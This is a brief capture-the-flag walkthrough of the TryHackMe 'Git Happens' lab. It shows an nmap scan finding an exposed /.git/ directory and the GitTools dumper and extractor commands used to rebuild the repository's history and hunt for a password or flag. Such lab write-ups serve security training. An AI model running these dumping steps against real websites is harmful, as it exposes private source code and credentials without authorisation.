---
title: "Tryhackme - Git Happens WriteUp"
date: 2020-10-18
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---

# TryHackMe - Git Happens WriteUp

Hello, everyone. Today I will share my notes from Git Happens vulnerable machine. I will try to share only the main points during the process.

**Keywords:** /.git/, GitTools, gitdumper.sh, extractor.sh

First of all, we do **nmap** scan.

```
root@kali:~/TryHackMe/Git Happens# nmap -p 80 -A 10.10.63.247
...
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.63.247:80/.git/
|     Git repository found!
...
```

Then we try to **dump** all the files from **/.git/** folder and then **extract** all the pushes.

For more: https://github.com/internetwache/GitTools/

Dumping:
```
root@kali:~/TryHackMe/Git Happens/.git# ./gitdumper.sh http://10.10.63.247/.git/ .
```

Extacting:
```
root@kali:~/TryHackMe/Git Happens/.git# ./extractor.sh /root/TryHackMe/Git\ Happens/.git/ ./extract-git/
```
Then read all the pushes add find the flag, password or anything useful .